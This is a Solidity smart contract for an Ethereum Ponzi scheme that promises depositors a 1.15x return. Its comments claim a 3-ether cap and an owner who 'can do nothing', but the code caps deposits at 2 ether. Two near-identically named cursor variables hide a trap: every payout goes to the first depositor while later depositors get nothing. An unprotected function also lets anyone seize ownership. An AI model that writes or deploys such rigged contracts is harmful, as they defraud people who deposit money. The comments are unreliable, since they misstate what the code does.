1 contract FirePonzi {
2    // NO FEE PONZI, 1.15 Multiplier, Limited to 3 Ether deposits, FAST and designed to be on FIRE !
3    // Only input and output, no destroy function, owner can do nothing !
4    
5   struct Player {
6       address etherAddress;
7       uint deposit;
8   }
9 
10   Player[] public persons;
11 
12   uint public payoutCursor_Id_ = 0;
13   uint public balance = 0;
14 
15   address public owner;
16 
17 
18   uint public payoutCursor_Id=0;
19   modifier onlyowner { if (msg.sender == owner) _ }
20   function quick() {
21     owner = msg.sender;
22   }
23 
24   function() {
25     enter();
26   }
27   function enter() {
28     if (msg.value < 100 finney) { // Only  > 0.1 Eth depoits
29         msg.sender.send(msg.value);
30         return;
31     }
32 	
33 	uint deposited_value;
34 	if (msg.value > 2 ether) { //Maximum 3 Eth per deposit
35 		msg.sender.send(msg.value - 2 ether);	
36 		deposited_value = 2 ether;
37     }
38 	else {
39 		deposited_value = msg.value;
40 	}
41 
42 
43     uint new_id = persons.length;
44     persons.length += 1;
45     persons[new_id].etherAddress = msg.sender;
46     persons[new_id].deposit = deposited_value;
47  
48     balance += deposited_value;
49     
50 
51 
52     while (balance > persons[payoutCursor_Id_].deposit / 100 * 115) {
53       uint MultipliedPayout = persons[payoutCursor_Id_].deposit / 100 * 115;
54       persons[payoutCursor_Id].etherAddress.send(MultipliedPayout);
55 
56       balance -= MultipliedPayout;
57       payoutCursor_Id_++;
58     }
59   }
60 
61 
62   function setOwner(address _owner) onlyowner {
63       owner = _owner;
64   }
65 }